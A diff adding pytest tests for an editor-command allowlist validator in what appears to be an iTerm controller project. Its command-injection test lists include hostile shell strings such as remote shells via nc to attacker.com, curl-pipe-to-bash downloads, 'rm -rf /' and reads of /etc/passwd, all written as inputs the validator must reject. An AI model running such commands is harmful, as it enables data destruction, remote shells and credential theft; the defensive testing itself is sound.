@@ -7,9 +7,14 @@ from pathlib import Path
 import pytest
 
 from iterm_controller.security import (
+    ALLOWED_EDITOR_COMMANDS,
+    EditorValidationError,
     PathTraversalError,
+    get_safe_editor_command,
+    is_editor_command_allowed,
     is_path_in_project,
     safe_join,
+    validate_editor_command,
     validate_filename,
     validate_path_in_project,
 )
@@ -376,3 +381,274 @@ class TestRealWorldScenarios:
         # On case-insensitive filesystems, this might matter
         with pytest.raises(PathTraversalError):
             validate_path_in_project("../../../ETC/PASSWD", tmp_path)
+
+
+class TestValidateEditorCommand:
+    """Test editor command validation against allowlist."""
+
+    def test_allowed_editor_code(self):
+        """VS Code 'code' command is allowed."""
+        assert validate_editor_command("code") == "code"
+
+    def test_allowed_editor_vim(self):
+        """Vim command is allowed."""
+        assert validate_editor_command("vim") == "vim"
+
+    def test_allowed_editor_nvim(self):
+        """Neovim command is allowed."""
+        assert validate_editor_command("nvim") == "nvim"
+
+    def test_allowed_editor_cursor(self):
+        """Cursor editor command is allowed."""
+        assert validate_editor_command("cursor") == "cursor"
+
+    def test_allowed_editor_subl(self):
+        """Sublime Text command is allowed."""
+        assert validate_editor_command("subl") == "subl"
+
+    def test_allowed_editor_emacs(self):
+        """Emacs command is allowed."""
+        assert validate_editor_command("emacs") == "emacs"
+
+    def test_allowed_editor_nano(self):
+        """Nano command is allowed."""
+        assert validate_editor_command("nano") == "nano"
+
+    def test_allowed_editor_open(self):
+        """macOS 'open' command is allowed."""
+        assert validate_editor_command("open") == "open"
+
+    def test_allowed_editor_zed(self):
+        """Zed editor is allowed."""
+        assert validate_editor_command("zed") == "zed"
+
+    def test_case_insensitive(self):
+        """Editor commands are case-insensitive."""
+        assert validate_editor_command("CODE") == "code"
+        assert validate_editor_command("Vim") == "vim"
+        assert validate_editor_command("NVIM") == "nvim"
+
+    def test_strips_whitespace(self):
+        """Whitespace is stripped from commands."""
+        assert validate_editor_command("  code  ") == "code"
+        assert validate_editor_command("\tvim\n") == "vim"
+
+    def test_empty_command_rejected(self):
+        """Empty commands are rejected."""
+        with pytest.raises(ValueError) as exc_info:
+            validate_editor_command("")
+        assert "empty" in str(exc_info.value).lower()
+
+    def test_whitespace_only_rejected(self):
+        """Whitespace-only commands are rejected."""
+        with pytest.raises(ValueError):
+            validate_editor_command("   ")
+
+    def test_unlisted_command_rejected(self):
+        """Commands not in allowlist are rejected."""
+        with pytest.raises(EditorValidationError) as exc_info:
+            validate_editor_command("malicious")
+        assert "not in the allowed" in str(exc_info.value)
+        assert exc_info.value.attempted_command == "malicious"
+
+    def test_rm_command_rejected(self):
+        """Dangerous 'rm' command is rejected."""
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("rm")
+
+    def test_shell_metacharacters_rejected(self):
+        """Shell metacharacters are rejected."""
+        dangerous_inputs = [
+            "code; rm -rf /",
+            "vim && cat /etc/passwd",
+            "emacs | nc attacker.com 1234",
+            "$(rm -rf /)",
+            "`rm -rf /`",
+            "nano\nrm -rf /",
+            "code > /etc/passwd",
+            "code < /dev/urandom",
+            "vim & background",
+            "code$()",
+            "nano${PATH}",
+            "vim{a,b}",
+            "code()",
+        ]
+        for dangerous_input in dangerous_inputs:
+            with pytest.raises(EditorValidationError):
+                validate_editor_command(dangerous_input)
+
+    def test_path_in_command_rejected(self):
+        """Commands containing paths are rejected."""
+        with pytest.raises(EditorValidationError) as exc_info:
+            validate_editor_command("/bin/sh")
+        assert "cannot contain paths" in str(exc_info.value)
+
+    def test_relative_path_rejected(self):
+        """Relative paths are rejected."""
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("./malicious")
+
+    def test_windows_path_rejected(self):
+        """Windows-style paths are rejected."""
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("C:\\Windows\\System32\\cmd.exe")
+
+    def test_command_with_arguments_rejected(self):
+        """Commands with arguments are rejected."""
+        # Note: This may trigger path or space check depending on content
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("vim -c ':!rm -rf /'")
+
+    def test_command_with_single_space_rejected(self):
+        """Commands with a single space are rejected."""
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("code file.txt")
+
+
+class TestIsEditorCommandAllowed:
+    """Test the boolean helper function for editor validation."""
+
+    def test_allowed_returns_true(self):
+        """Returns True for allowed commands."""
+        assert is_editor_command_allowed("code") is True
+        assert is_editor_command_allowed("vim") is True
+        assert is_editor_command_allowed("nvim") is True
+
+    def test_disallowed_returns_false(self):
+        """Returns False for disallowed commands."""
+        assert is_editor_command_allowed("rm") is False
+        assert is_editor_command_allowed("malicious") is False
+        assert is_editor_command_allowed("/bin/sh") is False
+
+    def test_empty_returns_false(self):
+        """Returns False for empty commands."""
+        assert is_editor_command_allowed("") is False
+        assert is_editor_command_allowed("   ") is False
+
+    def test_dangerous_returns_false(self):
+        """Returns False for dangerous commands."""
+        assert is_editor_command_allowed("code; rm -rf /") is False
+        assert is_editor_command_allowed("$(whoami)") is False
+
+
+class TestGetSafeEditorCommand:
+    """Test safe editor command retrieval with fallback."""
+
+    def test_valid_command_returned(self):
+        """Valid commands are returned as-is."""
+        assert get_safe_editor_command("code") == "code"
+        assert get_safe_editor_command("vim") == "vim"
+
+    def test_invalid_falls_back(self):
+        """Invalid commands fall back to default."""
+        assert get_safe_editor_command("malicious") == "open"
+        assert get_safe_editor_command("rm") == "open"
+
+    def test_custom_fallback(self):
+        """Custom fallback is used when specified."""
+        assert get_safe_editor_command("malicious", fallback="nano") == "nano"
+
+    def test_empty_falls_back(self):
+        """Empty commands fall back to default."""
+        assert get_safe_editor_command("") == "open"
+
+    def test_dangerous_falls_back(self):
+        """Dangerous commands fall back to default."""
+        assert get_safe_editor_command("code; rm -rf /") == "open"
+        assert get_safe_editor_command("/bin/sh -c 'bad'") == "open"
+
+    def test_invalid_fallback_goes_to_open(self):
+        """If fallback is also invalid, uses 'open'."""
+        # This shouldn't happen in practice, but test the safety net
+        result = get_safe_editor_command("malicious", fallback="also_malicious")
+        assert result == "open"
+
+
+class TestEditorValidationError:
+    """Test the EditorValidationError exception."""
+
+    def test_basic_message(self):
+        """Basic error message works."""
+        error = EditorValidationError("Invalid editor")
+        assert str(error) == "Invalid editor"
+
+    def test_with_attempted_command(self):
+        """Error includes attempted command."""
+        error = EditorValidationError(
+            "Invalid editor", attempted_command="rm -rf /"
+        )
+        assert "rm -rf /" in str(error)
+        assert error.attempted_command == "rm -rf /"
+
+    def test_inherits_from_exception(self):
+        """EditorValidationError is an Exception."""
+        error = EditorValidationError("test")
+        assert isinstance(error, Exception)
+
+
+class TestAllowedEditorCommands:
+    """Test the allowlist of editor commands."""
+
+    def test_common_editors_included(self):
+        """Common editors are in the allowlist."""
+        expected = ["code", "vim", "nvim", "emacs", "nano", "subl", "cursor", "open"]
+        for editor in expected:
+            assert editor in ALLOWED_EDITOR_COMMANDS
+
+    def test_jetbrains_ides_included(self):
+        """JetBrains IDE commands are included."""
+        expected = ["idea", "pycharm", "webstorm", "goland", "rubymine", "phpstorm"]
+        for ide in expected:
+            assert ide in ALLOWED_EDITOR_COMMANDS
+
+    def test_dangerous_commands_not_included(self):
+        """Dangerous commands are NOT in the allowlist."""
+        dangerous = ["rm", "sh", "bash", "python", "curl", "wget", "nc", "cat"]
+        for cmd in dangerous:
+            assert cmd not in ALLOWED_EDITOR_COMMANDS
+
+    def test_allowlist_is_frozenset(self):
+        """Allowlist is a frozenset (immutable)."""
+        assert isinstance(ALLOWED_EDITOR_COMMANDS, frozenset)
+
+
+class TestEditorValidationRealWorldScenarios:
+    """Test real-world attack scenarios for editor validation."""
+
+    def test_command_injection_via_editor_setting(self):
+        """Malicious editor setting cannot execute commands."""
+        attack_vectors = [
+            # Direct command execution
+            "rm -rf /",
+            "/bin/bash -c 'malicious'",
+            # Command chaining
+            "code; curl attacker.com | bash",
+            "vim && nc -e /bin/sh attacker.com 1234",
+            # Subshell execution
+            "$(curl attacker.com/script.sh | bash)",
+            "`cat /etc/passwd`",
+            # Background execution
+            "code & curl attacker.com &",
+            # Environment variable injection
+            "${PATH}",
+            # Brace expansion
+            "{rm,-rf,/}",
+        ]
+        for attack in attack_vectors:
+            with pytest.raises((EditorValidationError, ValueError)):
+                validate_editor_command(attack)
+
+    def test_path_traversal_via_editor(self):
+        """Cannot specify absolute paths to run arbitrary binaries."""
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("/tmp/malicious_script")
+
+        with pytest.raises(EditorValidationError):
+            validate_editor_command("../../../bin/sh")
+
+    def test_typical_user_config_values(self):
+        """Typical user configuration values work correctly."""
+        valid_configs = ["vscode", "code", "cursor", "vim", "nvim", "sublime", "subl"]
+        for config in valid_configs:
+            # Should not raise
+            validate_editor_command(config)
